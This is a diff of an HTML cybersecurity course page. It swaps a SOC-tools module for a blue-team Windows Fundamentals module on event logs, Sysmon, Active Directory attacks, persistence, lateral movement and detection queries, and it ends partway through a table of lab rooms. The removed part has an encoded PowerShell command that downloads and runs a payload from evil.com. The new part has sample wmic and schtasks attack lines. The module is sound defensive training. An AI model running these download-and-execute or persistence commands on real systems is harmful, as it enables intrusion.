@@ -1,76 +1,664 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-success mb-3"><i class="bi bi-book me-2"></i>Module 3: Core SOC Solutions</h6>
 
-<p style="color:#c0d0e0;">This module covers the three core technologies every SOC analyst must know: EDR (Endpoint Detection & Response), SIEM (Security Information & Event Management), and SOAR (Security Orchestration, Automation & Response).</p>
+<h4 class="text-primary mb-4"><i class="bi bi-windows me-2"></i>Module 3: Windows Fundamentals</h4>
 
-<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
+<!-- SECTION OVERVIEW -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-eye me-2"></i>Section Overview</h5>
+<p style="color:#c0d0e0;">Windows is the most common operating system in enterprise environments, making it the primary target for attackers. A SOC analyst must understand Windows internals — processes, services, registry, event logs, Active Directory, and security mechanisms — to detect and investigate threats. This module covers Windows architecture from a blue-team perspective, focusing on forensic artifacts, log analysis, and endpoint detection.</p>
+<p style="color:#c0d0e0;"><strong>Real-World Use Cases:</strong> Investigating ransomware outbreaks (LockBit, BlackBasta), detecting privilege escalation via JuicyPotato/PrintNightmare, identifying lateral movement via SMB/WMI, analyzing Event ID 4624 logins for pass-the-hash, and deploying Sysmon for comprehensive endpoint monitoring.</p>
+<p style="color:#c0d0e0;"><strong>Skills Gained:</strong> Windows Event Log analysis, Sysmon configuration and log parsing, Active Directory security monitoring, process and memory forensics, PowerShell script analysis, and Windows attack chain reconstruction.</p>
+<p style="color:#c0d0e0;"><strong>Prerequisites:</strong> Basic familiarity with Windows GUI and file system navigation.</p>
+<p style="color:#c0d0e0;"><strong>Learning Objectives:</strong> (1) Navigate Windows Event Viewer and extract security-relevant events using PowerShell. (2) Understand Windows process creation, registry, and service architecture. (3) Analyze Active Directory authentication (Kerberos, NTLM) for anomalies. (4) Deploy and interpret Sysmon logs for endpoint detection and response.</p>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to EDR</p>
-<p style="color:#c0d0e0;">EDR agents sit on endpoints (laptops, servers, workstations) and continuously monitor for suspicious activity. When threats are detected, the EDR can isolate the host, kill processes, and provide forensic data.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>EDR Capabilities:</b><br>
-- Process monitoring: Every running process, parent-child relationships<br>
-- File monitoring: File creations, modifications, deletions<br>
-- Registry monitoring: New run keys, service installations<br>
-- Network monitoring: Outbound connections, port usage<br>
-- Memory scanning: Detect injected code, process hollowing<br>
-- Response actions: Isolate host, kill process, block hash, collect forensics<br><br>
-<b>Example EDR Alert:</b> "Powershell.exe launched from Microsoft Word with encoded command"<br>
-EDR shows: Parent=WINWORD.EXE, Child=powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA=='<br>
-Decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')<br>
-<b>Response:</b> Isolate host → Kill process → Block file hash → Collect full forensic package
+<!-- DETAILED NOTES -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-journal-text me-2"></i>Detailed Notes</h5>
+
+<p style="color:#00d4ff;font-weight:600;">▸ SubTopic 1: Windows Process Architecture &amp; Memory Management</p>
+<p style="color:#c0d0e0;"><strong>Beginner:</strong> Windows processes: each process has a PID, parent PID (PPID), and runs under a user account. Task Manager shows running processes. Key processes: <code>System</code> (PID 4 — kernel), <code>smss.exe</code> (Session Manager), <code>csrss.exe</code> (Win32 subsystem), <code>wininit.exe</code> (services), <code>services.exe</code> (service manager), <code>lsass.exe</code> (authentication), <code>svchost.exe</code> (service host — multiple instances).</p>
+<p style="color:#c0d0e0;"><strong>Intermediate:</strong> SOC analysts must identify anomalous processes. <code>svchost.exe</code> always runs from <code>C:\Windows\System32\</code> — any other path is malicious. <code>lsass.exe</code> memory contains cached credentials — tools like Mimikatz dump lsass (detected by Sysmon Event ID 10 — lsass access). <code>tasklist /m</code> lists processes with loaded DLLs — check for suspicious DLLs injected into legitimate processes. <code>wmic process list full</code> provides detailed process info. Suspicious child processes: <code>winword.exe → cmd.exe → powershell.exe</code> indicates macro-enabled document executing malicious code.</p>
+<p style="color:#c0d0e0;"><strong>Advanced:</strong> Windows memory forensics: use Volatility 3 for deep analysis. Key plugins: <code>windows.pslist</code> (process list), <code>windows.pstree</code> (process tree — reveals parent-child anomalies), <code>windows.dlllist</code> (loaded DLLs), <code>windows.handles</code> (open handles — detect process injection), <code>windows.malfind</code> (detect injected code), <code>windows.ldrmodules</code> (detect hidden modules). Process injection techniques: (1) Classic DLL injection — CreateRemoteThread with LoadLibrary. (2) Process Hollowing — spawn legitimate process (svchost.exe), replace its memory with malicious code. (3) APC Injection — queue asynchronous procedure call to target thread. (4) AtomBombing — use global atom table for code injection. Sysmon Event ID 8 (CreateRemoteThread) detects many injection techniques.</p>
+<div class="bg-dark p-2 rounded small mb-3" style="border:1px solid #333;">
+<strong>Enterprise Example:</strong> CrowdStrike Falcon detects a process hollowing attempt: <code>"event_simpleName":"ProcessRollup2", "CommandLine":"C:\Windows\System32\rundll32.exe", "ImageFileName":"\\device\\harddiskvolume1\\windows\\system32\\rundll32.exe", "ParentProcessId":4284, "TGT_ID":0</code>. The parent is OUTLOOK.EXE (PID 4284) — email vector. The analyst correlates Sysmon Event ID 8 showing outlook.exe creating a remote thread in rundll32.exe. Memory analysis confirms hollowing: the original rundll32.exe code was replaced with Cobalt Strike beacon.
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to SIEM</p>
-<p style="color:#c0d0e0;">A SIEM aggregates logs from across the organization (firewalls, servers, endpoints, cloud) and provides analysis, correlation, alerting, and dashboards.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>SIEM Data Flow:</b><br>
-Data Sources (Windows, Linux, Firewall, EDR, Cloud) → Log Forwarders (Universal Forwarder, Beats) → SIEM Engine (Indexing, Parsing, Normalization) → Correlation Rules → Alerts → Dashboards → Analysts<br><br>
-<b>Example SIEM Correlation Rule:</b> "Brute Force Detection"<br>
-<code>Rule: When (EventID=4625 AND logon_type=3 AND count > 10 within 5 minutes) from same Source_IP<br>
-Result: Alert with severity=HIGH, assign to L1 SOC queue</code><br>
-When this rule triggers, the SIEM creates an alert with context: the source IP, target username, number of attempts, and time window.
+<p style="color:#00d4ff;font-weight:600;">▸ SubTopic 2: Windows Event Logs &amp; Sysmon</p>
+<p style="color:#c0d0e0;"><strong>Beginner:</strong> Windows Event Logs are the primary source of forensic data. Main logs: <code>Security</code> (logins, object access, privilege use), <code>System</code> (driver/service events), <code>Application</code> (app errors). Use Event Viewer (eventvwr.msc) to browse. Critical Security Event IDs: 4624 (successful logon), 4625 (failed logon), 4634 (logoff), 4672 (admin logon), 4688 (process creation), 4698 (scheduled task creation), 4702 (scheduled task update), 4720 (user account created), 4732 (user added to group).</p>
+<p style="color:#c0d0e0;"><strong>Intermediate:</strong> PowerShell for log analysis: <code>Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Properties[8].Value -ne '10'} | Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='SourceIP';E={$_.Properties[18].Value}} | Format-Table -AutoSize</code>. This filters for remote logins (Logon Type 10 = RemoteInteractive) from non-private IPs. Logon Types: 2 (Interactive — console), 3 (Network — SMB), 5 (Service), 7 (Unlock), 8 (NetworkCleartext — IIS), 9 (NewCredentials — RunAs), 10 (RemoteInteractive — RDP). Event ID 4688 (process creation) with command line logging shows exactly what commands were executed. Enable command line logging via GPO: <code>Administrative Templates → System → Audit Process Creation → Include command line in process creation events</code>.</p>
+<p style="color:#c0d0e0;"><strong>Advanced:</strong> Sysmon (System Monitor) by Mark Russinovich is the gold standard for Windows endpoint logging. Install: <code>Sysmon64.exe -accepteula -i sysmon-config.xml</code>. Key Event IDs:</p>
+<ul style="color:#c0d0e0;">
+<li><strong>Event ID 1:</strong> Process creation (with Hash, CommandLine, ParentProcess)</li>
+<li><strong>Event ID 3:</strong> Network connection (source/dest IP, port, process)</li>
+<li><strong>Event ID 7:</strong> Image loaded (DLL loaded by process — detect DLL sideloading)</li>
+<li><strong>Event ID 8:</strong> CreateRemoteThread (process injection)</li>
+<li><strong>Event ID 10:</strong> ProcessAccess (lsass dump detection — access to lsass.exe)</li>
+<li><strong>Event ID 11:</strong> FileCreate (file writes — detect ransomware writing files)</li>
+<li><strong>Event ID 12/13/14:</strong> Registry modification (persistence via Run keys, disable UAC)</li>
+<li><strong>Event ID 15:</strong> FileCreateStreamHash (NTFS alternate data stream — hide malware)</li>
+<li><strong>Event ID 22:</strong> DNSEvent (DNS query per process — detect C2 via DNS)</li>
+</ul>
+<div class="bg-dark p-2 rounded small mb-3" style="border:1px solid #333;">
+<strong>Sysmon-config Best Practice:</strong> Use <code>https://github.com/SwiftOnSecurity/sysmon-config</code> as a starting point. Generate hashes with SHA256 (not MD5). Exclude high-volume noise (Windows Update, Antivirus). Filter process creation with specific conditions: <code>&lt;ProcessCreate onmatch="include"&gt;&lt;CommandLine condition="contains"&gt;powershell&lt;/CommandLine&gt;&lt;/ProcessCreate&gt;</code> — only log PowerShell process creation. Use <code>Sysmon.exe -c -- -l</code> to reload config without restarting.
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Splunk: The Basics</p>
-<p style="color:#c0d0e0;">Splunk is the most widely used SIEM in enterprise SOCs. Its query language is SPL (Search Processing Language).</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Common SPL Commands:</b><br>
-<code>index=windows EventID=4625 | stats count by Account_Name, Source_IP | sort -count</code><br>
-→ Counts failed logins grouped by username and source IP, sorted by most attempts<br><br>
-<code>index=network src_ip=10.0.1.50 | timechart count by dest_ip</code><br>
-→ Shows outbound connections over time from a specific host<br><br>
-<code>index=proxy url="*.exe" | stats count by url, user | where count > 5</code><br>
-→ Finds users downloading executables via proxy, filter for download-heavy users<br><br>
-<code>index=windows EventID=4688 | search ParentImage=*WINWORD* AND Image=*powershell*</code><br>
-→ Detects Microsoft Office spawning PowerShell (classic phishing indicator)
+<p style="color:#00d4ff;font-weight:600;">▸ SubTopic 3: Active Directory &amp; Kerberos Authentication</p>
+<p style="color:#c0d0e0;"><strong>Beginner:</strong> Active Directory (AD) is Microsoft's directory service for Windows domains. Key components: Domain Controller (DC) authenticates users, manages policies. Users, computers, and groups are objects in AD. <code>Active Directory Users and Computers (dsa.msc)</code> manages objects. Kerberos is the default authentication protocol — uses tickets instead of passwords. NTLM is the legacy protocol (more vulnerable).</p>
+<p style="color:#c0d0e0;"><strong>Intermediate:</strong> Kerberos authentication flow: (1) User sends AS-REQ to DC (Authentication Server). (2) DC responds with AS-REP containing TGT (Ticket Granting Ticket) encrypted with user's password hash. (3) User sends TGT to TGS (Ticket Granting Service) with service request (TGS-REQ). (4) TGS responds with service ticket (TGS-REP). (5) User presents service ticket to target server. Security events: Event ID 4768 (TGT requested), 4769 (TGS requested), 4771 (Kerberos pre-auth failed), 4648 (explicit credential use — RunAs).</p>
+<p style="color:#c0d0e0;"><strong>Advanced:</strong> AD attack detection techniques:</p>
+<ul style="color:#c0d0e0;">
+<li><strong>Kerberoasting:</strong> Attacker requests TGS for service accounts (Event ID 4769 with RC4 encryption) and cracks offline. <em>Detection:</em> Multiple 4769 events from same user requesting different SPNs; unusual RC4 encryption type requests.</li>
+<li><strong>Golden Ticket:</strong> Attacker forges TGT using krbtgt hash. <em>Detection:</em> Kerberos ticket with anomalous lifetime (>10 hours), unusual user SIDs, or forged domain admin tickets. Event ID 4624 with unusual Logon GUID.</li>
+<li><strong>DCSync:</strong> Attacker uses Mimikatz to replicate DC database (retrieve password hashes). <em>Detection:</em> Event ID 4662 (Directory Service Access) with GUID for DS-Replication-Get-Changes. Monitor for <code>GetNCChanges</code> replication requests from non-DC computers.</li>
+<li><strong>Pass-the-Hash (PtH):</strong> Attacker uses NTLM hash instead of password. <em>Detection:</em> Multiple network logons (Logon Type 3) from same source to different targets using the same account. Sysmon Event ID 3 shows network connections to ADMIN$ shares.</li>
+<li><strong>Pass-the-Ticket (PtT):</strong> Attacker steals Kerberos tickets from memory. <em>Detection:</em> Check for anomalous TGT requests from workstations that normally don't request tickets (non-DC hosts).</li>
+</ul>
+<div class="bg-dark p-2 rounded small mb-3" style="border:1px solid #333;">
+<strong>Detection Query — Kerberoasting (Splunk):</strong> <code>index=windows EventCode=4769 TicketEncryptionType=0x17 AccountName!="*$" | stats count by AccountName, ServiceName, SourceIP | where count > 5</code> — finds Kerberoasting attempts where the same user requests multiple service tickets with RC4 encryption.
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Elastic Stack: The Basics</p>
-<p style="color:#c0d0e0;">The Elastic Stack (ELK: Elasticsearch, Logstash, Kibana) is a free and open-source alternative to Splunk. Elasticsearch stores and indexes logs, Logstash ingests and transforms data, and Kibana provides visualization and dashboards.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Elastic Stack Example:</b><br>
-<b>Kibana Query (EQL):</b><br>
-<code>process where event.code == "1" and process.parent.name == "WINWORD.EXE" and process.name == "powershell.exe"</code><br>
-→ Same detection as the Splunk query — Office spawning PowerShell<br><br>
-<b>Detection Rule (Elastic Security):</b><br>
-<code>sequence by host.ip<br>
-[process where event.code == "1" and process.name == "powershell.exe"]<br>
-[network where process.name == "powershell.exe" and destination.port == 443]</code><br>
-→ Detects PowerShell that also makes a network connection (potential C2)
+<p style="color:#00d4ff;font-weight:600;">▸ SubTopic 4: Windows Persistence &amp; Lateral Movement</p>
+<p style="color:#c0d0e0;"><strong>Beginner:</strong> Windows persistence allows malware to survive reboots. Common locations: <code>Run</code> registry keys (<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>), <code>Startup</code> folder (<code>C:\Users\[User]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>), scheduled tasks (<code>schtasks.exe /create</code>), services (<code>sc.exe create</code>).</p>
+<p style="color:#c0d0e0;"><strong>Intermediate:</strong> Attackers use advanced persistence:</p>
+<ul style="color:#c0d0e0;">
+<li><strong>WMI Event Subscription:</strong> Permanent WMI event filters trigger on system events (startup, user logon). <em>Detection:</em> <code>Get-WmiObject -Namespace root\subscription -Class __EventFilter</code></li>
+<li><strong>COM Hijacking:</strong> Replace CLSID registry entries to load malicious DLLs when applications start. <em>Detection:</em> Sysmon Event ID 13 (Registry modification) to CLSID keys.</li>
+<li><strong>DLL Search Order Hijacking:</strong> Place malicious DLL in a directory searched before the legitimate system directory. <em>Detection:</em> Sysmon Event ID 7 (Image loaded) from non-system paths.</li>
+<li><strong>AppInit_DLLs:</strong> DLLs loaded into every process that loads User32.dll. <em>Detection:</em> Check registry key <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</code></li>
+<li><strong>Bootkit:</strong> Infects Master Boot Record (MBR) or UEFI firmware. <em>Detection:</em> Use <code>Get-FirmwareType</code> and verify Secure Boot status; requires deep forensics.</li>
+</ul>
+<p style="color:#c0d0e0;"><strong>Advanced:</strong> Lateral movement techniques that SOC analysts detect:</p>
+<ul style="color:#c0d0e0;">
+<li><strong>PsExec:</strong> Admin tool that copies psexecsvc.exe to ADMIN$ and runs service. <em>Detection:</em> Event ID 5145 (network share access to ADMIN$), Event ID 7045 (service creation "PSEXECSVC"), Sysmon Event 3 (SMB connections).</li>
+<li><strong>WMI/WinRM:</strong> Remote execution via <code>wmic /node:target process call create "cmd.exe /c evil"</code>. <em>Detection:</em> Event ID 4688 with parent process WmiPrvSE.exe spawning cmd/powershell. WinRM: Event ID 168 (WinRM listener).</li>
+<li><strong>SMB/Admin Shares:</strong> Copy files via hidden ADMIN$ share. <em>Detection:</em> Event ID 5145 (network share access), Sysmon Event 3 (SMB file transfers).</li>
+<li><strong>RDP:</strong> Remote Desktop for interactive access. <em>Detection:</em> Event ID 4624 Logon Type 10 (RemoteInteractive), Event ID 4778/4779 (RDP session connect/disconnect).</li>
+<li><strong>DCOM:</strong> Remote COM object instantiation. <em>Detection:</em> Event ID 4688 with DllHost.exe spawning processes, unusual MMC20.Application or ShellWindows COM activations.</li>
+</ul>
+<div class="bg-dark p-2 rounded small mb-3" style="border:1px solid #333;">
+<strong>Enterprise Example — Ransomware Lateral Movement:</strong> LockBit ransomware uses PsExec to spread. Detection chain: (1) Sysmon Event 1: outlook.exe → cmd.exe (user opens phishing attachment). (2) Sysmon Event 3: cmd.exe connects to C2 server 185.220.101.34:8080. (3) Event ID 7045: service "LockBitSvc" installed on initial host. (4) Event ID 5145: ADMIN$ share access from initial host to backup server. (5) Event ID 7045 on backup server: "LockBitSvc" service installed. (6) Mass file rename events (Sysmon Event 11: .lockbit extension) on both hosts. The SOC isolates both hosts at step 4 when lateral movement is detected.
 </div>
 
-<p style="color:#00d4ff;font-weight:600;">🔹 Introduction to SOAR</p>
-<p style="color:#c0d0e0;">SOAR automates repetitive SOC tasks. When a SIEM alert fires, SOAR can automatically enrich the alert with threat intel, create a ticket, and even take containment actions.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>SOAR Playbook Example — "Phishing Response":</b><br>
-1. Trigger: User reports phishing email via Outlook plugin<br>
-2. SOAR extracts: Sender, Subject, Links, Attachments, Headers<br>
-3. Automation: Submit URLs to URLScan.io, submit attachments to sandbox, check sender reputation on VirusTotal<br>
-4. Enrichment: Add reputation scores, geo-location, domain age to incident<br>
-5. Decision: If malicious (score > 5/10) → block at email gateway, block URLs at proxy, delete from all inboxes<br>
-6. Notification: Notify SOC team, send phishing alert to all employees<br>
-7. Ticketing: Create incident ticket with all evidence attached<br>
-Total time saved: ~30 minutes per incident → 3+ hours per day
+<p style="color:#00d4ff;font-weight:600;">▸ Common Attacks on Windows Systems</p>
+<ul style="color:#c0d0e0;">
+<li><strong>Phishing with Malicious Macros:</strong> Office documents with VBA macros download and execute malware. <em>Detection:</em> Sysmon Event 1: winword.exe → cmd.exe → powershell.exe. Event ID 4688 shows command line with hidden WindowStyle. <em>Response:</em> Block macros from internet, deploy AMSI for PowerShell script block logging.</li>
+<li><strong>Pass-the-Hash:</strong> Use NTLM hash for lateral movement. <em>Detection:</em> Multiple Event ID 4624 Logon Type 3 from same source IP using same account; NTLM authentication without Kerberos. <em>Response:</em> Deploy Credential Guard, enable Windows Defender Credential Guard.</li>
+<li><strong>LSASS Credential Dumping:</strong> Tools like Mimikatz, ProcDump extract credentials from lsass.exe memory. <em>Detection:</em> Sysmon Event 10 (ProcessAccess to lsass.exe), Event ID 4688 for procdump.exe or comsvcs.dll usage. <em>Response:</em> Enable LSA Protection (RunAsPPL), Credential Guard, monitor lsass access.</li>
+<li><strong>Ransomware Execution:</strong> Encrypts files and demands payment. <em>Detection:</em> Sysmon Event 11 (mass file writes with new extensions), Event ID 4688 with suspicious process names. <em>Response:</em> Immediate host isolation, determine encryption scope, engage backup recovery.</li>
+<li><strong>Privilege Escalation:</strong> Exploiting vulnerabilities (PrintNightmare, ZeroLogon) or misconfigurations (AlwaysInstallElevated, Unquoted Service Paths). <em>Detection:</em> anomalous SYSTEM-level processes from non-elevated users; Event ID 4672 (Special Privilege Assigned) following known exploit CVEs.</li>
+<li><strong>Persistence via Scheduled Tasks:</strong> <code>schtasks /create /tn "Updater" /tr "powershell -enc base64..." /sc onstart</code>. <em>Detection:</em> Event ID 4698 (scheduled task created), 4702 (updated). Correlate with Sysmon Event 1 for taskeng.exe or svchost.exe spawning suspicious processes.</li>
+</ul>
+
+<!-- CONCEPT BOXES -->
+<div class="alert alert-info"><strong><i class="bi bi-info-circle me-1"></i> INFO BOX</strong><br>
+<strong>Windows Event IDs Cheat Sheet for SOC Analysts:</strong> 4624=Logon Success, 4625=Logon Failure, 4634=Logoff, 4648=RunAs, 4672=Admin Logon, 4688=Process Create, 4698=Task Create, 4700=Task Start, 4702=Task Update, 4719=Audit Policy Change, 4720=User Created, 4732=Group Member Added, 4740=Account Lockout, 4768=TGT Request (Kerberos), 4769=Service Ticket Request, 4771=Kerberos Pre-Auth Fail, 4776=Credential Validation (NTLM), 4798=User Group Enumeration, 4800=Workstation Lock, 4801=Workstation Unlock, 5140=File Share Access, 5145=Network Share Access, 5156=Connection Allowed (Windows Firewall), 5157=Connection Blocked, 7045=Service Installed. Memorize the top 20 — you'll see them daily.</div>
+
+<div class="alert alert-success"><strong><i class="bi bi-check-circle me-1"></i> REMEMBER BOX</strong><br>
+<strong>Sysmon is not a SIEM replacement — it's a sensor.</strong> Sysmon generates detailed logs but does not analyze or alert. You MUST ship Sysmon logs to a SIEM (Splunk, ELK, Sentinel) and write correlation rules. A common mistake: deploying Sysmon without a way to collect or analyze the logs. Always pair Sysmon with <code>Winlogbeat</code> (Elastic), <code>Universal Forwarder</code> (Splunk), or <code>Azure Monitor Agent</code> (Sentinel). Sysmon logs are stored in <code>Microsoft-Windows-Sysmon/Operational</code> Event Log.</div>
+
+<div class="alert alert-warning"><strong><i class="bi bi-exclamation-triangle me-1"></i> WARNING BOX</strong><br>
+<strong>PowerShell Script Block Logging (Event ID 4104) is your best defense against fileless attacks.</strong> Enable it via GPO: <code>Computer Configuration > Admin Templates > Windows Components > Windows PowerShell > Turn on PowerShell Script Block Logging</code>. This logs the full script content even if obfuscated (PowerShell will deobfuscate before execution). Combined with <code>PowerShell Module Logging</code> and <code>Transcript Logging</code>, you capture every PowerShell command ever executed. Without this, most fileless attacks are invisible.</div>
+
+<div class="alert alert-info"><strong><i class="bi bi-shield me-1"></i> SOC ANALYST TIP</strong><br>
+<strong>Master Windows forensic artifacts in this priority order:</strong> (1) <code>$MFT</code> (Master File Table) — every file on the system. (2) <code>$UsnJrnl</code> (USN Journal) — file changes in chronological order. (3) <code>Prefetch</code> files (<code>C:\Windows\Prefetch</code>) — recently executed programs. (4) <code>Amcache.hve</code> — application execution history. (5) <code>Shimcache</code> (AppCompatCache) — compatibility database with execution times. (6) <code>Event Logs (.evtx)</code> — system/security events. (7) <code>Registry Hives</code> (SAM, SYSTEM, SOFTWARE, NTUSER.DAT) — user activity, MRU lists, network shares. (8) <code>Jump Lists</code> (<code>%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations</code> — recently opened files. Use tools like <code>Zimmerman's Tools</code> (JLECmd, PECmd, AppCompatCacheParser) to parse these artifacts quickly during investigations.</div>
+
+<div class="alert alert-warning"><strong><i class="bi bi-question-circle me-1"></i> INTERVIEW Q&A</strong><br>
+<strong>Q:</strong> "A user reports their machine is behaving strangely. You check Sysmon logs and see Event ID 1 showing svchost.exe spawning cmd.exe, which spawned powershell.exe. What's your next step?"<br>
+<strong>A:</strong> "This is highly suspicious — svchost.exe should NEVER spawn cmd.exe or powershell.exe. The parent svchost.exe could be a service hosting process that was exploited or it's process hollowing (the svchost.exe is actually malicious). First, I'd check the full command line of all three processes from Sysmon Event 1 — especially the PowerShell command, which is likely base64-encoded or obfuscated. I'd check Event ID 3 for network connections from cmd.exe or powershell.exe to external IPs. I'd check the svchost.exe path — is it from C:\Windows\System32\ or a different location? I'd capture the svchost.exe binary and the PowerShell script block (Event ID 4104) for analysis. I'd isolate the host immediately, then proceed with offline forensics — memory dump, disk image, prefetch files, and timeline analysis to determine the full scope."</div>
+
+<!-- VISUAL DIAGRAMS -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-diagram-2 me-2"></i>Visual Diagrams</h5>
+<pre class="mermaid">
+flowchart TD
+    subgraph "Windows Authentication — Kerberos"
+    A["User"] -->|"1. AS-REQ (password hash)"| B["KDC (Domain Controller)"]
+    B -->|"2. AS-REP (TGT)"| A
+    A -->|"3. TGS-REQ (TGT + Service SPN)"| B
+    B -->|"4. TGS-REP (Service Ticket)"| A
+    A -->|"5. AP-REQ (Service Ticket)"| C["Target Server"]
+    C -->|"6. Access Granted"| A
+    end
+    subgraph "Attack Detection Points"
+    D["<b>Event 4768</b> — TGT Request"]
+    E["<b>Event 4769</b> — TGS Request (Kerberoasting)"]
+    F["<b>Event 4771</b> — Pre-auth Failed (AS-REP Roasting)"]
+    G["<b>Event 4662</b> — DCSync (Replication)"]
+    H["<b>Event 4624</b> — Logon (PtH via Logon Type 3)"]
+    end
+    B -.-> D
+    A -.-> F
+    C -.-> H
+    B -.-> E
+    B -.-> G
+    style A fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style B fill:#1a3a2a,stroke:#00d4ff,color:#e5e7eb
+    style C fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style D fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style E fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style F fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style G fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style H fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+</pre>
+
+<pre class="mermaid">
+flowchart TD
+    subgraph "Ransomware Attack Chain — Detection Timeline"
+    A["1. Initial Access<br/>Phishing Email"] --> B["2. Execution<br/>Macro → PowerShell"]
+    B --> C["3. Persistence<br/>Registry Run Key / Scheduled Task"]
+    C --> D["4. Discovery<br/>AD Enumeration, Network Scan"]
+    D --> E["5. Lateral Movement<br/>PsExec / WMI to other hosts"]
+    E --> F["6. Exfiltration<br/>Data collected via Rclone/HTTP"]
+    F --> G["7. Impact<br/>Encrypt files, deploy ransomware note"]
+    end
+    subgraph "Detection by Sysmon Event ID"
+    H["<b>Event 1:</b> winword → cmd → powershell"]
+    I["<b>Event 12/13:</b> Run key / Task creation"]
+    J["<b>Event 3:</b> Network scan / C2 connections"]
+    K["<b>Event 3:</b> SMB connections to ADMIN$"]
+    L["<b>Event 3:</b> HTTP POST to external IP (large data)"]
+    M["<b>Event 11:</b> Mass file creation (.lockbit extension)"]
+    end
+    A -.-> H
+    B -.-> H
+    C -.-> I
+    D -.-> J
+    E -.-> K
+    F -.-> L
+    G -.-> M
+    style A fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style B fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style C fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style D fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style E fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style F fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style G fill:#3a1a1a,stroke:#ff4444,color:#e5e7eb
+    style H fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+    style I fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+    style J fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+    style K fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+    style L fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+    style M fill:#1a3a2a,stroke:#00d48a,color:#e5e7eb
+</pre>
+
+<pre class="mermaid">
+flowchart LR
+    subgraph "Windows Event Forwarding Architecture"
+    A["Workstations (100)"] -->|"WinRM 5986 (HTTPS)"| B["Windows Event Collector (WEC)"]
+    C["Servers (50)"] -->|"WinRM 5986 (HTTPS)"| B
+    B -->|"ForwardedEvents Log"| D["Logstash / Winlogbeat"]
+    D -->|"Kafka"| E["SIEM (Splunk/ELK/Sentinel)"]
+    F["Domain Controllers (5)"] -->|"WinRM 5986"| B
+    end
+    subgraph "Source Initiated Collections"
+    G["Sysmon Logs"] --> A
+    H["Security Logs"] --> A
+    I["Sysmon Logs"] --> C
+    J["Security Logs"] --> C
+    K["Security + DNS Logs"] --> F
+    end
+    style A fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style B fill:#1a3a2a,stroke:#00d4ff,color:#e5e7eb
+    style C fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style D fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style E fill:#1a3a2a,stroke:#00d4ff,color:#e5e7eb
+    style F fill:#1a2a3a,stroke:#00d4ff,color:#e5e7eb
+    style G fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style H fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style I fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style J fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+    style K fill:#3a1a2a,stroke:#ffd700,color:#e5e7eb
+</pre>
+
+<!-- TRYHACKME SECTION -->
+<h5 class="text-primary mt-4 mb-3"><i class="bi bi-flag me-2"></i>TryHackMe Rooms</h5>
+<div class="table-responsive">
+<table class="table table-dark table-sm small" style="color:#c0d0e0;">
+<thead><tr><th>Room Name</th><th>Difficulty</th><th>Objectives</th><th>Order</th></tr></thead>
+<tbody>
+<tr><td>Windows Fundamentals 1</td><td><span class="badge bg-success">Easy</span></td><td>Windows desktop, file system, UAC, task manager basics</td><td>1st</td></tr>
+<tr><td>Windows Fundamentals 2</td><td><span class="badge bg-success">Easy</span></td><td>System configuration, event viewer, services, registry</td><td>2nd</td></tr>
+<tr><td>Active Directory Basics</td><td><span class="badge bg-success">Easy</span></td><td>AD structure, users, groups, GPO, domain join</td><td>3rd</td></tr>
+<tr><td>Hacking Windows via AD</td><td><span class="badge bg-warning" style="color:#000;">Medium</span></td><td>Kerberoasting, AS-REP roasting, pass-the-hash, DCSync</td><td>4th</td></tr>
